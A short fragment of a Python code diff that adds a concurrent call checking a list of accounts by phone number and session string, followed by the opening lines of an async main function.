+    await asyncio.gather(*(check_account(acc["phone"], acc["session_string"]) for acc in accounts))
 
 async def main():
     global bot_username
